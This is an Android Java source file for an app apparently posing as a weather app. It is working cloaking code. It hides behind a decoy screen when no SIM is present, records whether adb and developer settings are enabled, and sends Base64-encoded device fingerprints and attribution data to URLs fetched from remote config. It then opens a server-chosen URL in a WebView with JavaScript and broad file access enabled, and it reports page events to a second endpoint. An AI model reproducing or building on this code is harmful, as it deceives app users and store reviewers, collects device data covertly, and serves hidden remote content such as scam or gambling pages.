package com.windmill.atlantisweather;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageButton;

import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;
import com.yandex.metrica.YandexMetrica;
import com.yandex.metrica.YandexMetricaConfig;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.Date;
import java.util.HashMap;
import java.util.Objects;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class WezerActivity extends AppCompatActivity {

    private WebView wezerview;
    private View vwwezere;
    private ValueCallback<Uri[]> callatlantic;
    private final static int FILECHOOSER_RESULTCODE = 1;

    private Handler atlanticHand;
    private String idWezeAtlantic = "";
    private String deepatlanticity = "null";
    private String Wezereatrrewre = "null";

    private static boolean wezereTs = false;
    private String wezeratlant1;
    private String wezeratlant2;

    private FirebaseRemoteConfig wezerRmt;
    private FirebaseRemoteConfigSettings RmtAtlantic;
    private CountDownTimer wezeTime;

    int adb, development_setting;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wezer);

        adb = android.provider.Settings.Global.getInt(getApplicationContext().getContentResolver(), "adb_enabled", 0);
        development_setting = Settings.Secure.getInt(getApplicationContext().getContentResolver(), "development_settings_enabled", 0);

        ImageButton wezerstart = (ImageButton) findViewById(R.id.wezerstart);
        wezerstart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent start = new Intent(WezerActivity.this,StartingActivity.class);
                startActivity(start);
            }
        });


        ImageButton policitywezer = (ImageButton) findViewById(R.id.policitywezer);
        policitywezer.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                privacyShow("https://docs.google.com/document/d/1tyIPHutZhlJMMT3nJjOwMdCo-COFz9pnBc8O5Fa_vmU/edit?usp=sharing");
            }
        });

        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        int simState = telMgr.getSimState();
        if (simState == TelephonyManager.SIM_STATE_ABSENT) {
            vwwezere = (View) findViewById(R.id.wezersceen);
            vwwezere.setVisibility(View.VISIBLE);

            ImageButton simwezerstart  = (ImageButton) findViewById(R.id.wezerstart);
            simwezerstart.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent start = new Intent(WezerActivity.this, StartingActivity.class);
                    startActivity(start);
                }
            });

            ImageButton simpolicitywezer = (ImageButton) findViewById(R.id.policitywezer);
            simpolicitywezer.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    privacyShow("https://docs.google.com/document/d/1tyIPHutZhlJMMT3nJjOwMdCo-COFz9pnBc8O5Fa_vmU/edit?usp=sharing");
                }
            });
        } else {
            inFire();
        }
    }

    private void inFire() {
        initFirebase();
        fetchDataFromRemote();
    }

    private void privacyShow(String s) {
        Uri uri = Uri.parse(s);
        startActivity(new Intent(Intent.ACTION_VIEW,uri));
    }

    private void initFirebase() {
        wezerRmt = FirebaseRemoteConfig.getInstance();
        RmtAtlantic = new FirebaseRemoteConfigSettings.Builder().setMinimumFetchIntervalInSeconds(0).build();
        wezerRmt.setConfigSettingsAsync(RmtAtlantic);
    }

    private void fetchDataFromRemote() {
        wezerRmt.fetchAndActivate().addOnCompleteListener(new OnCompleteListener<Boolean>() {
            @Override
            public void onComplete(@NonNull Task<Boolean> task) {
                String timeatlantic = wezerRmt.getString("timeatlantic");
                countDown(timeatlantic);
            }
        });
    }

    private void countDown(String time1) {
        int time;
        try {
            time = Integer.parseInt(time1);
        } catch (NumberFormatException e) {
            time = 0;
        }
        wezeTime = new CountDownTimer(time, 1000) {
            @Override
            public void onTick(long l) {

            }

            @Override
            public void onFinish() {

                String wez1 = wezerRmt.getString("wez1");
                String wez2 = wezerRmt.getString("wez2");

                if (!wez1.equalsIgnoreCase("") && !wez2.equalsIgnoreCase("")) {

                    wezeratlant1 = wez1;
                    wezeratlant2 = wez2;
                    start1();
                } else {

                    initViews();
                    vwwezere.setVisibility(View.VISIBLE);
                }
            }
        };
        wezeTime.start();


    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(wezeTime != null) {
            wezeTime.cancel();
        }
    }

    @SuppressLint("UseCompatLoadingForDrawables")
    public void start1() {
        appOpen();
        initViews();
        atlanticHand = new Handler(Looper.getMainLooper(), msg -> {
            if (msg.obj.equals("close"))
                vwwezere.setVisibility(View.VISIBLE);
            else
                opn((String) msg.obj);
            return false;
        });

        String read = read();

        trackers();

//        if (read.length() > 0 && read.contains("ttp"))
//            opn(read);
//        else
        getReferer();
    }

    private void initViews() {
        wezerview = findViewById(R.id.wezerzeus);
        vwwezere = (View) findViewById(R.id.wezersceen);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void opn(String s) {
        vwwezere.setVisibility(View.INVISIBLE);
        wezerview.setVisibility(View.VISIBLE);
        wezerview.setWebChromeClient(new MyClient());
        wezerview.setWebViewClient(new MyWebClient());

        wezerview.getSettings().setUseWideViewPort(true);
        wezerview.getSettings().setLoadWithOverviewMode(true);

        wezerview.getSettings().setDomStorageEnabled(true);
        wezerview.getSettings().setJavaScriptEnabled(true);
        wezerview.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

        wezerview.getSettings().setAllowFileAccessFromFileURLs(true);
        wezerview.getSettings().setAllowUniversalAccessFromFileURLs(true);

        wezerview.getSettings().setAllowFileAccess(true);
        wezerview.getSettings().setAllowContentAccess(true);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);
        CookieManager.getInstance().setAcceptCookie(true);

        wOpen(s);
        wezerview.loadUrl(s);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (requestCode == FILECHOOSER_RESULTCODE) {
            if (callatlantic == null)
                return;
            callatlantic.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
            callatlantic = null;
        }
    }

    private class MyClient extends WebChromeClient {
        @Override
        public boolean onShowFileChooser(WebView webView,
                                         ValueCallback<Uri[]> filePathCallback,
                                         FileChooserParams fileChooserParams) {
            callatlantic = filePathCallback;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent, "File Chooser"), FILECHOOSER_RESULTCODE);
            return true;
        }
    }

    @Override
    public void onBackPressed() {
        if (wezerview.canGoBack()) {
            wezerview.goBack();
        } else {
            super.onBackPressed();
        }
    }


    private void getReferer() {
        idWezeAtlantic = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        Wezereatrrewre = AppsFlyerLib.getInstance().getAttributionId(this);
        if (Wezereatrrewre == null)
            Wezereatrrewre = "null";

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {
                    if (appLinkData != null) {
                        deepatlanticity = Objects.requireNonNull(appLinkData.getTargetUri()).toString();
                        Log.d("getTargetUri", deepatlanticity);
                    }
                    if(!wezereTs) {
                        new Thread(this::collecting).start();
                    }
                }
        );
    }

    private void collecting() {
        wezereTs = true;
        Message message = new Message();
        message.obj = collect();
        atlanticHand.sendMessage(message);
    }

    private class MyWebClient extends WebViewClient {
        @TargetApi(Build.VERSION_CODES.N)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            if (!request.getUrl().toString().contains("accounts.google.com")) {
                if (request.getUrl().toString().startsWith("http"))
                    view.loadUrl(request.getUrl().toString());
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, request.getUrl()));
            }
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            if (!url.contains("accounts.google.com")) {
                if (url.startsWith("http"))
                    view.loadUrl(url);
                else
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
            }
            return true;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            wFinish(url);
            write(url);
        }

        @RequiresApi(api = Build.VERSION_CODES.M)
        @Override
        public void onReceivedError(WebView webview, WebResourceRequest request, WebResourceError error) {
            wError(request.getUrl() + "___" + error.getDescription());
        }
    }

    public String getUUID() {
        SharedPreferences sharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
        String uuid = sharedPreferences.getString("key", "null");

        if (uuid.equals("null")) {
            uuid = String.valueOf(java.util.UUID.randomUUID());
            SharedPreferences mySharedPreferences = getSharedPreferences("key", MODE_PRIVATE);
            @SuppressLint("CommitPrefEdits") SharedPreferences.Editor editor = mySharedPreferences.edit();
            editor.putString("key", uuid);
            editor.apply();
        }
        return uuid;
    }

    public String collect() {
        int i = 0;

        while (true) {
            String apsInfo = read_key1("nil");
            if (!apsInfo.equals("nil") || i == 5) {
                String s = toJSON(apsInfo);
                String read = read();
                if (read.length() > 0 && read.contains("ttp")) {
                    return send(wezeratlant1, ""); //todo вставить ссылку на апи редирект
                }else {
                    return send(wezeratlant1, s);
                }
            } else {
                try {
                    Thread.sleep(1500);
                    i++;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                    i++;
                }
            }
        }
    }

    private String send(String s, String s1) {
        final MediaType JSON = MediaType.get("application/json; charset=utf-8");
        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(s1, JSON);

        Request request = new Request.Builder()
                .url(s)
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try (Response response = client.newCall(request).execute()) {
            String responseString = Objects.requireNonNull(response.body()).string();

            JSONObject respJSON = new JSONObject(responseString);
            if (respJSON.getBoolean("success")) {
                write(respJSON.getString("url"));
                return respJSON.getString("url");
            } else {
                return "close";
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "close";
        }
    }

    public String toJSON(String apsInfo) {
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("appsFlyerId", idWezeAtlantic);
            jsonObject.put("deeplink", deepatlanticity);
            jsonObject.put("attributionId", Wezereatrrewre);
            jsonObject.put("apsInfo", new JSONObject(apsInfo));
            jsonObject.put("phoneInfo", getJson());

            String encodedJson = new String(Base64.encode(jsonObject.toString().getBytes(), Base64.NO_WRAP));
            jsonObject = new JSONObject();
            jsonObject.put("data", encodedJson);

            return jsonObject.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private void trackers() {
        YandexMetricaConfig config = YandexMetricaConfig.newConfigBuilder("3a6ddb96-4ced-4647-b74d-14270b39db19").build();//todo вставить ключ метрики
        YandexMetrica.activate(getApplicationContext(), config);
        YandexMetrica.enableActivityAutoTracking(getApplication());

        FacebookSdk.setApplicationId("331096019160614");//todo вставить ключ фб
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(getApplicationContext());
        FacebookSdk.fullyInitialize();
        AppEventsLogger.activateApp(getApplication());

        OneSignal.initWithContext(this);
        OneSignal.setAppId("83491565-dfbb-4d02-85b7-79f07aba2fd2");//todo вставить ключ сигнала

        String externalUserId = getUUID();

        OneSignal.setExternalUserId(externalUserId, new OneSignal.OSExternalUserIdUpdateCompletionHandler() {
            @Override
            public void onSuccess(JSONObject results) {
                try {
                    if (results.has("push") && results.getJSONObject("push").has("success")) {
                        boolean isPushSuccess = results.getJSONObject("push").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for push status: " + isPushSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }

                try {
                    if (results.has("email") && results.getJSONObject("email").has("success")) {
                        boolean isEmailSuccess = results.getJSONObject("email").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for email status: " + isEmailSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                try {
                    if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                        boolean isSmsSuccess = results.getJSONObject("sms").getBoolean("success");
                        OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id for sms status: " + isSmsSuccess);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(OneSignal.ExternalIdError error) {
                // The results will contain channel failure statuses
                // Use this to detect if external_user_id was not set and retry when a better network connection is made
                OneSignal.onesignalLog(OneSignal.LOG_LEVEL.VERBOSE, "Set external user id done with error: " + error.toString());
            }
        });
    }

    public void wError(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_e_w");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void appOpen() {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", "null");
            jsonObject.put("name", "a_o");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wOpen(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_o_w");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    public void wFinish(String s) {
        JSONObject jsonObject = new JSONObject();
        JSONObject data = new JSONObject();

        try {
            data.put("param1", s);
            jsonObject.put("name", "a_p_f");
            jsonObject.put("data", data);
            jsonObject.put("created", new Date().getTime());
        } catch (Exception e) {
            e.printStackTrace();
        }

        new Thread(() -> send(jsonObject)).start();
    }

    private void send(JSONObject jsonObject) {
        OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(String.valueOf(jsonObject), JSON);

        Request request = new Request.Builder()
                .url(wezeratlant2)//todo вставить ссылку на апи ивентов
                .post(body)
                .addHeader("Content-Type", "application/json")
                .addHeader("Device-UUID", getUUID())
                .build();

        try {
            client.newCall(request).execute();
        } catch (Exception e) {
            e.printStackTrace();

        }
    }

    public JSONObject getJson() {
        HashMap<String, String> map = new HashMap<>();
        map.put("user_agent", System.getProperties().getProperty("http.agent"));
        map.put("fingerprint", Build.FINGERPRINT);
        map.put("manufacturer", Build.MANUFACTURER);
        map.put("device", Build.DEVICE);
        map.put("model", Build.MODEL);
        map.put("brand", Build.BRAND);
        map.put("hardware", Build.HARDWARE);
        map.put("board", Build.BOARD);
        map.put("bootloader", Build.BOOTLOADER);
        map.put("tags", Build.TAGS);
        map.put("type", Build.TYPE);
        map.put("product", Build.PRODUCT);
        map.put("host", Build.HOST);
        map.put("display", Build.DISPLAY);
        map.put("id", Build.ID);
        map.put("user", Build.USER);
        map.put("adb_enabled", String.valueOf(adb));
        map.put("development_settings_enabled", String.valueOf(development_setting));

        return new JSONObject(map);
    }

    public void write(String string) {
        try {
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("file", MODE_PRIVATE)));
            bw.write(string);
            bw.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String read() {
        StringBuilder s = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(openFileInput("file")));
            String str;
            while ((str = br.readLine()) != null) {
                s.append(str);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return s.toString();
    }

    public String read_key1(String def) {
        SharedPreferences myPrefs = getSharedPreferences("file", Context.MODE_PRIVATE);
        return myPrefs.getString("key1", def);
    }
}